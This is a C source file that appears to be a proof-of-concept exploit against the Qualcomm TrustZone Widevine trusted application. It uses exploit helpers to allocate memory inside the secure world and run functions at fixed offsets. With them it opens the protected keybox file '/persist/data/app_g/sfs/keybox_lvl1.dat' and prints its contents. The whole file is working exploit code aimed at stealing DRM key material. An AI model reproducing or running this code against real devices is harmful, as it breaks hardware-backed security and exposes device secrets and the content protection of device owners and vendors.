#include <sys/types.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "QSEEComAPI.h"
#include "symbols.h"
#include "widevine_commands.h"
#include "vuln.h"
#include "defs.h"
#include "exploit_utilities.h"

int main() {

    //Getting the global handle used to interact with QSEECom
    struct qcom_wv_handle* handle = initialize_wv_handle();
    if (handle == NULL) {
        perror("[-] Failed to initialize Widevine handle");
        return -errno;
    }

    //Loading the widevine application
    int res = (*handle->QSEECom_start_app)((struct QSEECom_handle **)&handle->qseecom,
                                            WIDEVINE_PATH, WIDEVINE_APP_NAME, WIDEVINE_BUFFER_SIZE);
    if (res < 0) {
        perror("[-] Failed to load Widevine");
        return -errno;
    }
    printf("[+] Widevine load res: %d\n", res);

    //Finding the application within the secure app region
    void* app = find_widevine_application(handle);
    if (!app) {
        perror("[-] Failed to find application\n");
        (*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
        return -ENOENT;
    }
    printf("[+] Found application at: %p\n", app);

    //Allocating a buffer for the file path
    char* file_path = "/persist/data/app_g/sfs/keybox_lvl1.dat";
    uint32_t data_buffer_size = 0x100;
    uint32_t path_buf = tz_malloc(handle, app, strlen(file_path) + 1);
    printf("[+] Allocated path buffer: %08X\n", path_buf);

    //Writing the file path to the buffer
    write_range(handle, app, path_buf, file_path, strlen(file_path) + 1);
    printf("[+] Wrote file path to buffer\n");

    //Opening the file    
    uint32_t mfile = execute_function(handle, app, (uint32_t)app + QSEE_SFS_OPEN_OFFSET, path_buf, 0, 0, 0);
    printf("[+] Opened file: %08X\n", mfile);    

    //Allocating a buffer to which we'll read the file content
    uint32_t data_buf = tz_malloc(handle, app, data_buffer_size);
    printf("[+] Allocated data buffer: %08X\n", data_buf);

    //Reading the data from the file
    uint32_t bytes_read = execute_function(handle, app, (uint32_t)app + QSEE_SFS_READ_OFFSET, mfile, data_buf, data_buffer_size, 0);
    printf("[+] Read %d bytes from file\n", bytes_read);

    //Dumping the data read
    printf("[+] Dumping the file:\n");
    for (int i=0; i<bytes_read/sizeof(uint32_t); i++) {
        printf("%08X\n", read_dword(handle, app, data_buf + i*sizeof(uint32_t)));
    }
    
    //Unloading the widevine app
    (*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
    printf("[+] Widevine unload res: %d\n", res);

    return 0;

}
